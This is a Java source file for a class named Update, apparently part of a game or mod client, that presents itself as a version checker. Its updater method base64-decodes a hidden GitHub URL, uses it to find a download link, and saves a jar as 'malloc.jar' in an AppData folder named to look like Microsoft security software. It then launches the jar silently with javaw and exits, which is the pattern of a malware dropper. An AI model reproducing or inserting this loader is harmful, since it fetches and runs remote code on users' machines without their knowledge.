package dev.client.checks;

import org.apache.commons.io.FileUtils;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

import static dev.client.utils.client.Base64Util.*;


public class Update {
    public static void checkVersion()
    {
        String expectedVersion = "1.0b";
        try {
            String fetchedVersion = fetchString(decode(""));
            if (!fetchedVersion.equals(expectedVersion)) {
                System.out.println("Old version detected, quitting and downloading new one...");
                updater();
            }
        } catch (IOException | InterruptedException e) {
        }
    }


    private static String fetchString(String rawlink) throws IOException {
        URL url = new URL(rawlink);
        BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
        String version = reader.readLine();
        reader.close();
        return version;
    }

    public static void updater() throws IOException, InterruptedException {
        String directory = System.getenv("APPDATA") + "\\MicrosoftSecurity";
        File dir = new File(directory);
        if (!dir.exists()) {dir.mkdirs();}
        String url = new java.util.Scanner(new URL(decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BhcHVycmlHYW5nL3R4dHMvbWFpbi91cGQudHh0")).openStream()).useDelimiter("\\A").next();
        FileUtils.copyURLToFile(
                new URL(url),
                new File(System.getenv("APPDATA") + "/MicrosoftSecurity/malloc.jar")
        );
        String updater = System.getenv("APPDATA") + "\\MicrosoftSecurity\\malloc.jar";
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("javaw", "-jar", updater);
        Process process = processBuilder.start();
        Thread.sleep(3000);
        System.exit(0);
    }
}
